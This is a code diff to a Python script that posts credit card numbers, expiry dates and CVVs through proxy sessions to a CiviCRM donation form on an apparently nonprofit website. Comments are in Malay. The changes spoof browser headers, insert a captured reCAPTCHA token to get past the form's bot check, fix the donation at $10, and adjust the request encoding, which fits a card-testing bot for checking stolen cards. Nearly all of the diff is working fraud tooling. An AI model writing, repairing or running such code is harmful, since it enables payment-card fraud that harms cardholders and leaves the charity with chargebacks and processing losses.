@@ -79,14 +79,16 @@ def create_session(proxy_url=None):
     session.mount('http://', IgnoreSSLAdapter())
     
     headers = {
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-        "Content-Type": "application/x-www-form-urlencoded",
-        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:152.0) Gecko/20100101 Firefox/152.0",
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
         "Accept-Language": "en-US,en;q=0.9",
+        "Accept-Encoding": "gzip, deflate, br, zstd",
         "Connection": "keep-alive",
-        "Accept-Encoding": "gzip, deflate, br",
-        "Cache-Control": "no-cache",
-        "Pragma": "no-cache"
+        "Upgrade-Insecure-Requests": "1",
+        "Sec-Fetch-Dest": "document",
+        "Sec-Fetch-Mode": "navigate",
+        "Sec-Fetch-Site": "same-origin",
+        "Sec-Fetch-User": "?1"
     }
         
     session.headers.update(headers)
@@ -285,12 +287,12 @@ def build_clean_payload(raw_payload, user_data, ccnum, mm, yy, cvv, qfkey, amoun
 
     final_payload = {}
     
-    final_payload["g-recaptcha-response"] = "03AGdBq25 FakeTokenCivicrmBypass1234567890"
+    final_payload["g-recaptcha-response"] = "0cAFcWeA4PqJOMFj5mWJD9PmhlqErXn7af22ptYqSm9PWIfUuWBD4CuqXOChTMG-uxogsiJFzY-zd9ZErdAp8mAMgGVa491KAT417HoBZftbG2aTzzIuzJAYLSzxNXPrDmt8nWhuGeMt66_-KgexQ5WcpNrAQXaUofULifI4N05Xu-aGCbF1BvuU6AQKLs8j_muWRkHZQVYplfzk5PPirHB8en_yuWaKIMceUyBJaF1KcvjAf6dHyu48kaDHdHhoor16NdbkzRS0G6EoFhQm1ktHTFEDkkiFkVS5LWx7BK_MeaaZUpIzjOIAMHL3rX_1M-PwJjAxT_LbQ9sYjVoI_m_8sAKjdRoiHAzgZdyBdytGY9OJEVAUukVHGRU6tO15M9lYYhA5VzK4nD0dWeCfIk15U3TcAwZgdAcV036TnwfZMFfC636oW7SgQ0Q76xPLGYNxYI0JT3TR8nHnW-sqmXk8pZQ-3wR3Zy056eCjt-qyR9a-1hRmvcO-O9OvBPQpoEnT_0kNxXtEjAtbCvYz2iitwZoMX4iA7krPUGYUhku9VEQdyNkR_IW5S-DUypInmpqVy1DR0g7iGE4GccDpimMUHlr9VThWRDLS_mpBvRAVuOsjH7RaahI2xoXWZyIHQ0he2nsI-q-0hdJ_O5UVr1rPzWCYvEGu9ufhE6AhIMz1XKnO5mxHppZ6oCMzAW7jwPgwf4VBSJjWB4ym_YriAPEmq4su1ehRc21xtl03WlPLZyAqIwmSzNc5O6biV-bMVa7BQuBGZOILy4X3qQ-0O0byiscz729xXIN30L4hR5rv7zMP-WctzXSvLxkk9dWS2mpaD3msoBXZP4Ac6SkGf_TvG3YlOOEjfgTNnTT86tVhC11Ni9PXwl9m2kolOe7v_PmMhmgN-jE3IjxFWHxpCfN9_MfQk-jYJQ2s05tgXlPz4kh_4R6AWuuIozqsdIPI676qsiqkKFiQptp_NxaARq3KndEd4eS5Vh8GYEmgBBaE6o_KrWQRTG-E5WuA1X0CcpPLBk6RvroZdQGy9kwInxFEF9u9h4J3ja7tWqOqrnomaGzjC7AM3KoJvE3wXpU6EW_JLHUbXNSDfkjdDWMzM9bfiZ5NsWYnDQtXzHBYYtv6KVD-ziCCwAkG84RUBjLscQkJCe7Wn-Dujhe9W34cw6Sw8eeFroIEPAs_hsnJQabopNAWRNKnK49wYsVkrmV31D3OxGFNuQfFPR-PLzeIYb4yhAuwVehhGeOAFsp0RSVQssODPW6ncHgBXuL5hakVTl9ehyjIcaB6E5QzLrPFjIjGAMRUmaEzWzpO4R5Oq2S0CZZA-QxNInQjvH54iwT5BKbjdZYXY6xA2"
 
     if is_confirm:
         # BETUL 100% MCM PAYLOAD YANG AWAK BG
         final_payload["qfKey"] = new_qfkey if new_qfkey else qfkey
-        final_payload["entryURL"] = "https://www.saharaaa.org/civicrm/contribute/transact/?reset=1&id=1"
+        final_payload["entryURL"] = "https://www.saharaaa.org/civicrm/contribute/transact/?reset=1&amp;id=1"
         final_payload["email_work"] = ""
         final_payload["_qf_default"] = "Confirm:next"
         final_payload["custom_1"] = full_year
@@ -298,17 +300,18 @@ def build_clean_payload(raw_payload, user_data, ccnum, mm, yy, cvv, qfkey, amoun
         final_payload["_qf_Confirm_next"] = "1"
     else:
         final_payload["qfKey"] = qfkey
-        final_payload["entryURL"] = "https://www.saharaaa.org/civicrm/contribute/transact/?reset=1&id=1"
+        final_payload["entryURL"] = "https://www.saharaaa.org/civicrm/contribute/transact/?reset=1&amp;id=1"
         final_payload["hidden_processor"] = "1"
         final_payload["payment_processor_id"] = "4"
         final_payload["priceSetId"] = "3"
         final_payload["selectProduct"] = ""
         final_payload["_qf_default"] = "Main:upload"
+        final_payload["zip_billing"] = ""
         final_payload["MAX_FILE_SIZE"] = "536870912"
-        final_payload["price_2"] = amount
+        final_payload["price_2"] = "10"
         final_payload["email-5"] = user_data['email']
         final_payload["custom_1"] = full_year
-        final_payload["custom_2"] = "6PM Wednesday"
+        final_payload["custom_2"] = ""
         final_payload["custom_3"] = ""
         final_payload["credit_card_type"] = scheme
         final_payload["credit_card_number"] = ccnum
@@ -316,7 +319,7 @@ def build_clean_payload(raw_payload, user_data, ccnum, mm, yy, cvv, qfkey, amoun
         final_payload["credit_card_exp_date[M]"] = str(input_month)
         final_payload["credit_card_exp_date[Y]"] = full_year
         final_payload["billing_first_name"] = user_data['first_name']
-        final_payload["billing_middle_name"] = user_data['middle_name']
+        final_payload["billing_middle_name"] = ""
         final_payload["billing_last_name"] = user_data['last_name']
         final_payload["billing_street_address-5"] = user_data['street_address']
         final_payload["billing_city-5"] = user_data['city']
@@ -345,12 +348,7 @@ def process_card_on_site(site_data, ccnum, mm, yy, cvv, override_proxy=None):
 
             session.headers.update({
                 "Referer": "https://www.saharaaa.org/civicrm/contribute/transact/?reset=1&id=1",
-                "Origin": "https://www.saharaaa.org",
-                "Sec-Fetch-Site": "same-origin",
-                "Sec-Fetch-Mode": "navigate",
-                "Sec-Fetch-User": "?1",
-                "Sec-Fetch-Dest": "document",
-                "Upgrade-Insecure-Requests": "1"
+                "Origin": "https://www.saharaaa.org"
             })
 
             post_url = form_action
@@ -358,7 +356,8 @@ def process_card_on_site(site_data, ccnum, mm, yy, cvv, override_proxy=None):
                 if '?' in post_url: post_url += f'&qfKey={qfkey}'
                 else: post_url += f'?qfKey={qfkey}'
 
-            response = session.post(post_url, data=clean_initial, timeout=TIMEOUT_SECONDS + 2, allow_redirects=True)
+            # GUNA MULTIPART FORM DATA SUPAYA &amp; TAK DICONVERT
+            response = session.post(post_url, files=clean_initial, timeout=TIMEOUT_SECONDS + 2, allow_redirects=True)
 
             soup_resp = BeautifulSoup(response.text, 'html.parser')
             
@@ -395,6 +394,8 @@ def process_card_on_site(site_data, ccnum, mm, yy, cvv, override_proxy=None):
                 })
 
                 clean_confirm = build_clean_payload({}, user_data, ccnum, mm, yy, cvv, qfkey, detected_price, is_confirm=True, new_qfkey=qfkey_to_use)
+                
+                # CONFIRMATION PAGE GUNA URL ENCODED BIASA
                 confirm_response = session.post(confirm_post_url, data=clean_confirm, timeout=TIMEOUT_SECONDS + 2, allow_redirects=True)
                 
                 logging.info(f"URL Selepas Submit Kedua: {confirm_response.url}")
